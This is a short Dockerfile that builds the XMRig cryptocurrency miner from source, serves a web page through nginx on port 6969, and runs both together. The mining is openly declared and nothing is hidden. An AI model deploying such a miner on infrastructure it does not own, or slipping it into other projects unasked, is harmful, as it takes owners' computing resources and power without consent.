# Use an official Ubuntu as a base image
FROM ubuntu:latest

# Install dependencies
RUN apt-get update && apt-get install -y \
    git \
    build-essential \
    cmake \
    libuv1-dev \
    libssl-dev \
    libhwloc-dev \
    nginx

# Clone XMRig repository
RUN git clone https://github.com/xmrig/xmrig.git

# Build XMRig
RUN mkdir xmrig/build && cd xmrig/build && \
    cmake .. && \
    make -j$(nproc)

# Set up config file (replace with your own config)
COPY config.json /xmrig/build/config.json

# Expose mining port
EXPOSE 3333

# Copy the custom Nginx configuration to serve the web page
COPY nginx.conf /etc/nginx/sites-available/default

# Copy the index.html file to Nginx document root
COPY index.html /var/www/html/index.html

# Expose port for the web page
EXPOSE 6969

# Set working directory
WORKDIR /xmrig/build

# Command to run XMRig and Nginx
CMD service nginx start && ./xmrig --config=config.json
